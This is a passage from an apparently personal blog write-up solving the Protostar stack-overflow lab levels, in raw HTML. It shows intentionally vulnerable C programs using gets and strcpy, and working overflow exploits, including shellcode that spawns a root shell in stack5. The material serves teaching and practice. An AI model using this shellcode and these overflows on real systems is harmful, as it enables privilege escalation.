</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64')
</span><span class='line'>Try again, you got 0x00000000
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x41414141].pack("V") ')
</span><span class='line'>Try again, you got 0x41414141
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x61626364].pack("V") ')
</span><span class='line'>you have correctly got the variable to the right value</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack2</h2>

<figure class='code'><figcaption><span>stack2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack2 
</span><span class='line'>stack2: please set the GREENIE environment variable
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x41414141].pack("V")') ./stack2 
</span><span class='line'>Try again, you got 0x41414141
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x0d0a0d0a].pack("V")') ./stack2 
</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack3</h2>

<figure class='code'><figcaption><span>stack3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span><span class='line'>      <span class="n">fp</span><span class="p">();</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We need to rewrite fp function address with the address of win().</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x41414141].pack("V")' | ./stack3 
</span><span class='line'>calling function pointer, jumping to 0x41414141
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
</span><span class='line'>08048424 T win
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x08048424].pack("V")' | ./stack3 
</span><span class='line'>calling function pointer, jumping to 0x08048424
</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack4</h2>

<figure class='code'><figcaption><span>stack4.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Window 1:
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
</span><span class='line'>
</span><span class='line'># Window 2:
</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./stack4 
</span><span class='line'>Reading symbols from /opt/protostar/bin/stack4...done.
</span><span class='line'>
</span><span class='line'>(gdb) r
</span><span class='line'>Starting program: /opt/protostar/bin/stack4 
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x63413563 in ?? ()
</span><span class='line'>
</span><span class='line'># Window 1:
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
</span><span class='line'>[*] Exact match at offset 76
</span><span class='line'>
</span><span class='line'># Window 2:
</span><span class='line'>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
</span><span class='line'>080483f4 T win
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "A" * 76 + [0x080483f4].pack("V")' | ./stack4 
</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack5</h2>

<figure class='code'><figcaption><span>stack5.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>

<p>Stack is executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</span></code></pre></td></tr></table></div></figure>


<p>To have the same address in bash and gdb, we use hellman&rsquo;s fixenv tool.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone https://github.com/hellman/fixenv
</span><span class='line'>Cloning into fixenv...
</span><span class='line'>remote: Counting objects: 20, done.
</span><span class='line'>Unpacking objects: 100% (20/20), done.
</span><span class='line'>remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20
</span><span class='line'>
</span><span class='line'>user@protostar:~$ cd fixenv/
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5 
</span><span class='line'>GNU gdb (GDB) 7.0.1-debian
</span><span class='line'>Copyright (C) 2009 Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html>
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
</span><span class='line'>and "show warranty" for details.
</span><span class='line'>This GDB was configured as "i486-linux-gnu".
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/>...
</span><span class='line'>Reading symbols from /home/user/fixenv/.launcher...done.
</span><span class='line'>
</span><span class='line'>(gdb) set disassembly-flavor intel
</span><span class='line'>
</span><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>0x080483c4 &lt;main+0>:   push   ebp
</span><span class='line'>0x080483c5 &lt;main+1>:   mov    ebp,esp
</span><span class='line'>0x080483c7 &lt;main+3>:   and    esp,0xfffffff0
</span><span class='line'>0x080483ca &lt;main+6>:   sub    esp,0x50
</span><span class='line'>0x080483cd &lt;main+9>:   lea    eax,[esp+0x10]
</span><span class='line'>0x080483d1 &lt;main+13>:  mov    DWORD PTR [esp],eax
</span><span class='line'>0x080483d4 &lt;main+16>:  call   0x80482e8 &lt;gets@plt>
</span><span class='line'>0x080483d9 &lt;main+21>:  leave  
</span><span class='line'>0x080483da &lt;main+22>:  ret    
</span><span class='line'>End of assembler dump.
</span><span class='line'>
</span><span class='line'>(gdb) b *0x080483d4
</span><span class='line'>Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
</span><span class='line'>
</span><span class='line'>(gdb) b *0x080483d9
</span><span class='line'>Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.
</span><span class='line'>
</span><span class='line'>(gdb) r
</span><span class='line'>Starting program: /home/user/fixenv/.launcher 
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
</span><span class='line'>10    stack5/stack5.c: No such file or directory.
</span><span class='line'>  in stack5/stack5.c
</span><span class='line'>
</span><span class='line'>(gdb) x /xw $esp
</span><span class='line'>0xbffff810:   0xbffff820
</span><span class='line'>
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>ABCDEFGH
</span><span class='line'>
</span><span class='line'>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
</span><span class='line'>11    in stack5/stack5.c
</span><span class='line'>(gdb) x /s 0xbffff820
</span><span class='line'>0xbffff820:    "ABCDEFGH"</span></code></pre></td></tr></table></div></figure>


<p>The address <code>0xbffff820</code> represents the buffer[] address, we store our
shellcode here and jump to this address. Also we know, that return address is
overwritten after position 76, from Protostar Stack4. We created our shellcode
<a href="http://localhost:4000/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">here</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "\x90" * (76 - sc.length) + [0xbffff820].pack("V") ' | ./r.sh /opt/protostar/bin/stack5 
</span><span class='line'>user@protostar:~/fixenv$</span></code></pre></td></tr></table></div></figure>


<p>The shell is executed, however it receives EOF. For this purposes, we can keep it alive with <code>cat</code> command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "\x90" * (76 - sc.length) + [0xbffff820].pack("V") '; cat -) | ./r.sh /opt/protostar/bin/stack5
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<p>Sometimes a more convenient solution could be storing shellcode in environment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ export EGG=$(ruby -e 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ ./r.sh getvar EGG
</span><span class='line'>0xbfffff60  \x60\xff\xff\xbf  (EGG)
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ ruby -e 'print "A" * 76 + [0xbfffff60].pack("V")' | ./r.sh /opt/protostar/bin/stack5
</span><span class='line'>user@protostar:~/fixenv$ 
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A" * 76 + [0xbfffff60].pack("V")' ; cat) | ./r.sh /opt/protostar/bin/stack5
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<p>We do not need to use <code>r.sh</code> again - the EGG address could be easily calculated (albeit it&rsquo;s different, because <code>fixenv</code> clears our environment):</p>

<figure class='code'><figcaption><span>getenv.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="cm">/* Get environment variable location */</span>
</span><span class='line'>        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="cm">/* Adjust for program name */</span>
</span><span class='line'>        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ gcc getenv.c -o getenv
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ ./getenv EGG /opt/protostar/bin/stack5
</span><span class='line'>EGG will be at 0xbffff9b0
</span><span class='line'>
</span><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A" * 76 + [0xbffff9b0].pack("V")' ; cat) | /opt/protostar/bin/stack5
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack6</h2>

<figure class='code'><figcaption><span>stack6.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
